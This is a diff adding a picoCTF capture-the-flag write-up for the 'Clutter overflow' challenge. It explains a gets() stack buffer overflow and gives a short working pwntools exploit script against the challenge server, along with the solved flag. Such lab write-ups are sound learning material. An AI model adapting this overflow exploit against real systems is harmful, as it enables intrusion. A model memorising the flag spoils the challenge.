@@ -70,3 +70,54 @@ Quite an easy challenge, only required two tries.
 
 ## References
 https://www.geeksforgeeks.org/c/format-specifiers-in-c/
+
+***
+
+
+# 3. Clutter overflow
+Clutter, clutter everywhere and not a byte to use. nc mars.picoctf.net 31890
+
+## Solution
+Looking into the nc conntection, we see this
+
+![](IMAGES/testpay.png "test payload to nc")
+
+Passing the payload also gives us a 0x0 which does not align with the given code of '0xdeadbeef'. Looking into the C source for a bit we see that the program uses gets, which is vulnerable to a bufferoverflow and can be used to exploit the system and convert the stack to store the hex code of deadbeef. Being given the hint of using pwntools we script this using p64 and remote.
+
+```py
+from pwn import remote, p64
+
+r = remote("mars.picoctf.net", 31890)
+r.sendline(b"A"*0x108 + p64(0xdeadbeef))
+print(r.recvall(timeout=4).decode(errors="ignore"))
+r.close()
+```
+
+Saving this as `exploit.py` we further pass this in the terminal
+
+```zsh
+python3 exploit.py
+```
+
+Giving us the flag.
+
+
+## Flag:
+```
+picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
+```
+
+## Concepts learnt
+Here p64 passes a little-endian representation of the hex code after overflowing the buffer, rewriting it with the representation of `0xdeadbeef`. 
+Remote here estabilshes a connection automatically to the challenge server via code. (no need to nc in terminal)
+`r.recvall()` reads everything the remote end sends until the connection closes. 
+`.decode(errors="ignore")` converts the raw bytes to a string for printing
+`.sendline()` just processes and passes our payload to the nc connection, essentially doing the typing job
+b"..." produces a bytes object to pass raw binary data
+
+The reason why we script this is because of the fact that we can't pass the raw binary data of the converted text as ASCII into the nc connection and hence requires so. I think printf also works here as it passes data as raw binary but I couldn't seem to get it to pipe into the nc connection.  
+
+## Notes
+
+
+## References
